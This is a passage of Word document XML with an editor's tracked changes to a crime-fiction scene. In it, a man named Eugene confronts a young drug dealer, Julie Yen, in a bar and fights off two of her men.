        <w:r w:rsidRPr="000D3488" w:rsidDel="006D1015">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">purse </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and withdraw</w:t>
      </w:r>
      <w:del w:id="65" w:author="TextVet" w:date="2016-03-14T17:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00333D2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> it</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> carefully, one manicured fingernail </w:t>
      </w:r>
      <w:del w:id="66" w:author="TextVet" w:date="2016-03-14T17:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00007776">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">held </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">upturned like a spoon, carrying a small scoop of fine white powder that promptly </w:t>
      </w:r>
      <w:ins w:id="67" w:author="TextVet" w:date="2016-03-14T11:36:00Z">
        <w:r w:rsidR="006D1015">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>fl</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="68" w:author="TextVet" w:date="2016-03-14T11:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006D1015">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>disappear</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed up her nose.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glanced at his phone</w:t>
      </w:r>
      <w:ins w:id="69" w:author="TextVet" w:date="2016-03-14T17:48:00Z">
        <w:r w:rsidR="00AE0B93">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="70" w:author="TextVet" w:date="2016-03-14T17:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AE0B93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="71" w:author="TextVet" w:date="2016-03-14T17:48:00Z">
        <w:r w:rsidR="00AE0B93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="72" w:author="TextVet" w:date="2016-03-14T17:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AE0B93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>S</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">till no word from Sergey. </w:t>
      </w:r>
      <w:ins w:id="73" w:author="TextVet" w:date="2016-03-14T17:48:00Z">
        <w:r w:rsidR="00077B86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>G</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="74" w:author="TextVet" w:date="2016-03-14T17:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00077B86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With a g</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rimac</w:t>
      </w:r>
      <w:ins w:id="75" w:author="TextVet" w:date="2016-03-14T17:48:00Z">
        <w:r w:rsidR="00077B86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="76" w:author="TextVet" w:date="2016-03-14T17:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00077B86">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he rolled his shoulders, cracked his knuckles, and strode forward.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bodyguard’s arm immediately barred his approach.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want a word with the lady,” Eugene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“Lady doesn’t want to talk to you,” the guard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talked past him, directly to the girl. “Have you heard of Sergey Mukhayev?”</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cocked an eyebrow and put away her phone. “Let him through,” she </w:t>
      </w:r>
      <w:ins w:id="77" w:author="TextVet" w:date="2016-03-14T17:49:00Z">
        <w:r w:rsidR="006577C8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>com</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="78" w:author="TextVet" w:date="2016-03-14T17:50:00Z">
        <w:r w:rsidR="006577C8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>m</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="79" w:author="TextVet" w:date="2016-03-14T17:49:00Z">
        <w:r w:rsidR="000F7202">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ande</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="80" w:author="TextVet" w:date="2016-03-14T17:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F7202">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 xml:space="preserve">d. The guard stepped back to resume his post at her side. She spent several silent seconds scrutinizing Eugene, her fingers fiddling against her cocktail glass. Her </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>pupils were the size of dimes. “So. I figured I’d run into you sooner or later. Eugene, right? I've heard stories.”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 you have a name?”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girl sipped her drink. “Julie. Julie Yen. Get to know it. It’ll be a household word.”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this distance, Eugene confirmed his initial impression: the girl was still mostly a child. He shook his head. “What the hell is this? Did your daddy get you a My Little Druglord playset for your birthday?”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guard beside her snarled, “Respect the lady!”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 lady is stepping on some very big toes.”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chuckled. “Yeah. I bet I am. Thomas Edison stepped on the toes of the candle industry too. And Henry Ford pissed off a lot of horse breeders.”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don’t know what the fuck you’re talking about, little girl,” said Eugene. “What I </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="81" w:author="TextVet" w:date="2016-03-14T17:50:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> know is that you are in Sergey’s territory. And that means you better start answering a lot of questions if you know what’s good for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bodyguard advanced. “You’re threatening my boss, buddy. Your conversation’s over.”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“Where is your source?” Eugene barked over the guard’s shoulder. “Who is your cartel contact? How are you evading Coast Guard patrols?”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Julie Yen laughed </w:t>
      </w:r>
      <w:ins w:id="82" w:author="TextVet" w:date="2016-03-14T17:53:00Z">
        <w:r w:rsidR="00836405">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>with the cruel confidence of middle age</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="83" w:author="TextVet" w:date="2016-03-14T17:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C92641">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>raucously</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Oh, Eugene! Dear obsolete, useless Eugene! What would be the point of explaining anything? You wouldn’t understand a word I told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Eugene noticed that the click of </w:t>
      </w:r>
      <w:del w:id="84" w:author="TextVet" w:date="2016-03-14T11:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DD19D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">colliding </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">billiard balls behind him had ceased. </w:t>
      </w:r>
      <w:ins w:id="85" w:author="TextVet" w:date="2016-03-14T11:40:00Z">
        <w:r w:rsidR="00DD19D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>I</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="86" w:author="TextVet" w:date="2016-03-14T11:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DD19D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>He realized tha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t could mean only one thing: the two men who had been playing pool must be standing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ducked </w:t>
      </w:r>
      <w:del w:id="87" w:author="TextVet" w:date="2016-03-14T17:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CF25F5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">down </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>into a squat, spinning and kicking out</w:t>
      </w:r>
      <w:del w:id="88" w:author="TextVet" w:date="2016-03-14T17:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CF25F5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> as he dropped</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. His leg </w:t>
      </w:r>
      <w:del w:id="89" w:author="TextVet" w:date="2016-03-14T17:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006148D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">made </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>con</w:t>
      </w:r>
      <w:ins w:id="90" w:author="TextVet" w:date="2016-03-14T17:55:00Z">
        <w:r w:rsidR="006148D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ne</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="91" w:author="TextVet" w:date="2016-03-14T17:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006148D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ta</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ct</w:t>
      </w:r>
      <w:ins w:id="92" w:author="TextVet" w:date="2016-03-14T17:55:00Z">
        <w:r w:rsidR="006148D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with an ankle. He crooked his knee, sweeping the foot of one of the men behind him. The would-be assailant fell backward,</w:t>
      </w:r>
      <w:ins w:id="93" w:author="TextVet" w:date="2016-03-14T17:56:00Z">
        <w:r w:rsidR="003117BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> arms pinwheeling</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="94" w:author="TextVet" w:date="2016-03-14T17:57:00Z">
        <w:r w:rsidR="003117BC">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ins w:id="95" w:author="TextVet" w:date="2016-03-14T17:57:00Z">
        <w:r w:rsidR="003117BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>and bashed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="96" w:author="TextVet" w:date="2016-03-14T17:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003117BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>knocking</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his head against the pool table</w:t>
      </w:r>
      <w:del w:id="97" w:author="TextVet" w:date="2016-03-14T17:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003117BC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> as he tumbled</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Eugene rose to deliver </w:t>
      </w:r>
      <w:del w:id="98" w:author="TextVet" w:date="2016-03-14T17:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AA46CB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText xml:space="preserve">his fallen opponent </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:ins w:id="99" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
        <w:r w:rsidR="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">chest </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>stomp</w:t>
      </w:r>
      <w:del w:id="100" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> on the chest</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="101" w:author="TextVet" w:date="2016-03-14T17:56:00Z">
        <w:r w:rsidR="00AA46CB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">The felled man’s </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="102" w:author="TextVet" w:date="2016-03-14T17:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AA46CB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>R</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="103" w:author="TextVet" w:date="2016-03-14T17:56:00Z">
        <w:r w:rsidR="00AA46CB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ibs cracked beneath his heel.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turned to the other pool player just in time to </w:t>
      </w:r>
      <w:ins w:id="104" w:author="TextVet" w:date="2016-03-14T17:58:00Z">
        <w:r w:rsidR="009D7909">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>glanc</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="105" w:author="TextVet" w:date="2016-03-14T17:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009D7909">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>se</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">e a cue swinging </w:t>
      </w:r>
      <w:ins w:id="106" w:author="TextVet" w:date="2016-03-14T11:40:00Z">
        <w:r w:rsidR="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>for</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="107" w:author="TextVet" w:date="2016-03-14T11:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his face. He leaned into the arc of the swing, grabbed the stick, and spun with its momentum, turning his back toward its wielder. An elbow jab made contact with the attacker’s gut hard enough to sink him to his knees, but the man’s grip on the stick remained firm. Eugene wrestled the cue downward against the floor and pushed until it cracked in two. </w:t>
      </w:r>
      <w:ins w:id="108" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
        <w:r w:rsidR="004E252B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>G</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="109" w:author="TextVet" w:date="2016-03-14T11:41:00Z">
